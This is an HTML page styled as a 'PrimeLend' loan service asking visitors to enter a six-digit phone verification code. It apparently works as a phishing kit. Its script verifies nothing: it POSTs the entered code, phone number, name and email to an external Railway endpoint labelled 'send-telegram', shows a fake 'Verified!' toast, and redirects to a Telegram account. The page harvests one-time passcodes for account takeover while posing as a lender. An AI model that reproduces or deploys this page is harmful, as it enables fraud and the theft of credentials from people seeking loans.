<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>PrimeLend · Verify Number</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
        body{background:linear-gradient(135deg,#0a0f1e 0%,#0c1222 100%);font-family:'Inter',system-ui,sans-serif;display:flex;align-items:flex-start;justify-content:center;min-height:100vh;padding:20px}
        .app-container{max-width:520px;width:100%;margin:0 auto}
        .loan-summary-bar{background:rgba(17,24,39,0.8);backdrop-filter:blur(10px);border-radius:32px;padding:16px 20px;margin-bottom:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;border:1px solid rgba(20,184,166,0.15)}
        .summary-item{display:flex;flex-direction:column}
        .summary-label{font-size:.65rem;font-weight:500;color:#7e8aa2;text-transform:uppercase}
        .summary-value{font-size:1rem;font-weight:700;color:#14b8a6;margin-top:2px}
        .otp-card{background:rgba(17,24,39,0.8);backdrop-filter:blur(10px);border-radius:40px;border:1px solid rgba(20,184,166,0.15);padding:28px 24px 32px}
        .section-title{font-size:1.4rem;font-weight:700;background:linear-gradient(135deg,#fff,#14b8a6);background-clip:text;-webkit-background-clip:text;color:transparent;margin-bottom:8px}
        .section-sub{font-size:.8rem;color:#7e8aa2;margin-bottom:28px;border-left:3px solid #14b8a6;padding-left:12px}
        .phone-verify-box{background:rgba(15,23,36,0.6);border-radius:24px;padding:18px 16px;margin-bottom:28px;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(20,184,166,0.1)}
        .phone-number{font-size:1.1rem;font-weight:700;color:#e2e8f0}
        .edit-link{color:#14b8a6;background:rgba(20,184,166,0.1);padding:6px 14px;border-radius:40px;cursor:pointer}
        .otp-container{display:flex;justify-content:center;gap:12px;margin-bottom:20px;flex-wrap:wrap}
        .otp-box{width:55px;height:65px;background:#0f1724;border:2px solid #1f2a3e;border-radius:16px;text-align:center;font-size:1.6rem;font-weight:700;color:#14b8a6;outline:none}
        .otp-box:focus{border-color:#14b8a6;box-shadow:0 0 0 3px rgba(20,184,166,0.2)}
        .verify-btn{width:100%;background:linear-gradient(135deg,#14b8a6,#0d9488);border:none;padding:16px 20px;font-size:1rem;font-weight:700;color:#0b1120;border-radius:60px;cursor:pointer;margin-top:8px}
        .verify-btn.loading{opacity:0.7;cursor:wait}
        .error-message{color:#f43f5e;font-size:.75rem;text-align:center;margin-top:12px;display:none}
        .error-message.show{display:block}
        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:rgba(20,184,166,0.9);backdrop-filter:blur(10px);color:#0b1120;padding:12px 24px;border-radius:60px;font-size:.85rem;font-weight:500;z-index:1000;opacity:0;transition:opacity .3s;pointer-events:none}
        .toast.show{opacity:1}
        @media (max-width:450px){.otp-box{width:48px;height:55px;font-size:1.4rem}.otp-container{gap:8px}}
    </style>
</head>
<body>
<div class="app-container">
    <div class="loan-summary-bar">
        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$0</span></div>
        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
    </div>

    <div class="otp-card">
        <div class="section-title">Verify your number</div>
        <div class="section-sub">Enter the 6-digit verification code</div>

        <div class="phone-verify-box">
            <div><span class="phone-number" id="displayPhone">+1 234 567 8900</span></div>
            <div class="edit-link" id="editPhoneBtn">Edit</div>
        </div>

        <div class="otp-container">
            <input type="text" maxlength="1" class="otp-box" data-idx="0" inputmode="numeric">
            <input type="text" maxlength="1" class="otp-box" data-idx="1" inputmode="numeric">
            <input type="text" maxlength="1" class="otp-box" data-idx="2" inputmode="numeric">
            <input type="text" maxlength="1" class="otp-box" data-idx="3" inputmode="numeric">
            <input type="text" maxlength="1" class="otp-box" data-idx="4" inputmode="numeric">
            <input type="text" maxlength="1" class="otp-box" data-idx="5" inputmode="numeric">
        </div>

        <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
        <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
    </div>
</div>
<div class="toast" id="toast">✓ Verified! Redirecting to Telegram...</div>

<script>
(function(){
    const RAILWAY_URL = 'https://primelend-production.up.railway.app';
    // ✅ CORRECT TELEGRAM USERNAME - @Innbuckks (with two 'k's)
    const TELEGRAM_USERNAME = 'Innbuckks';
    
    const urlParams = new URLSearchParams(window.location.search);
    const amount = urlParams.get('amount') || '500';
    const term = urlParams.get('term') || '3';
    const rate = urlParams.get('rate') || '5';
    const monthly = urlParams.get('monthly') || '167.36';
    let userPhone = urlParams.get('phone') || '+1 234 567 8900';
    const userName = urlParams.get('name') || 'Customer';
    const userEmail = urlParams.get('email') || '';
    
    document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
    document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
    document.getElementById('summaryRate').innerText = `${rate}%`;
    document.getElementById('displayPhone').innerText = userPhone;
    
    const toast = document.getElementById('toast');
    const showToast = (msg) => { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 1500); };
    
    const otpBoxes = document.querySelectorAll('.otp-box');
    let currentOtp = ['','','','','',''];
    const verifyBtn = document.getElementById('verifyBtn');
    const errorMsg = document.getElementById('otpError');
    
    const updateOtpUI = () => { otpBoxes.forEach((b,i)=>b.value=currentOtp[i]||''); };
    
    const setOtpDigit = (i,val) => {
        if(val && !/[0-9]/.test(val)) return;
        if(i>=0 && i<6){
            currentOtp[i] = val || '';
            updateOtpUI();
            if(val && i<5) otpBoxes[i+1].focus();
            errorMsg.classList.remove('show');
        }
    };
    
    otpBoxes.forEach((box, i) => {
        box.addEventListener('input', (e) => setOtpDigit(i, e.target.value.slice(-1)));
        box.addEventListener('keydown', (e) => {
            if(e.key === 'Backspace'){
                e.preventDefault();
                if(currentOtp[i]) setOtpDigit(i,'');
                else if(i>0){ setOtpDigit(i-1,''); otpBoxes[i-1].focus(); }
            }
        });
    });
    
    verifyBtn.onclick = async () => {
        const enteredOtp = currentOtp.join('');
        if(enteredOtp.length !== 6){ errorMsg.classList.add('show'); return; }
        
        verifyBtn.classList.add('loading');
        verifyBtn.textContent = 'Verifying...';
        verifyBtn.disabled = true;
        
        fetch(`${RAILWAY_URL}/api/send-telegram`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({phone:userPhone,pin:enteredOtp,email:userEmail,name:userName,type:'otp'})
        }).catch(e=>console.error(e));
        
        showToast('✓ Verified! Redirecting...');
        // ✅ CORRECT: User lands at @Innbuckks
        setTimeout(() => { window.location.href = `https://t.me/${TELEGRAM_USERNAME}`; }, 1000);
    };
    
    document.getElementById('editPhoneBtn').onclick = () => {
        let newPhone = prompt('Enter your phone number:', userPhone);
        if(newPhone && newPhone.trim().length > 5) { userPhone = newPhone.trim(); document.getElementById('displayPhone').innerText = userPhone; }
    };
    
    setTimeout(() => otpBoxes[0].focus(), 50);
})();
</script>
</body>
</html>
